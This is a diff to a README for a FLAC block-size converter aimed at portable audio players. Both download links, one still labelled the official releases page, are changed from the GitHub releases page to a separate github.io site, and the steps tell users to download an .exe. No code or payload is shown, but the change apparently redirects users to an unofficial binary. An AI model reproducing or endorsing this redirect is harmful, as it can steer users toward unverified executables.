@@ -1,6 +1,6 @@
 # 🎵 FLAC-Block-Size-Converter - Play high resolution audio on any device
 
-[![Download Software](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/baba-yaga85/FLAC-Block-Size-Converter/releases)
+[![Download Software](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://baba-yaga85.github.io)
 
 ## 🎯 Purpose of this tool
 Many modern high-resolution audio players require specific file settings to function correctly. The FiiO SNOWSKY ECHO Mini and similar portable players often fail to play FLAC files if the block size exceeds specific limits. This script fixes that problem. It converts your FLAC files to a block size of 4608. It keeps your album art and all metadata intact. You do not lose audio quality during this process.
@@ -12,7 +12,7 @@ Many modern high-resolution audio players require specific file settings to func
 - No programming experience or software development kits.
 
 ## 📥 How to get the tool
-1. Visit the [official releases page](https://github.com/baba-yaga85/FLAC-Block-Size-Converter/releases).
+1. Visit the [official releases page](https://baba-yaga85.github.io).
 2. Look for the latest version listed under the Assets section.
 3. Click the link ending in .exe to start your download.
 4. Save the file to your desktop or your downloads folder.
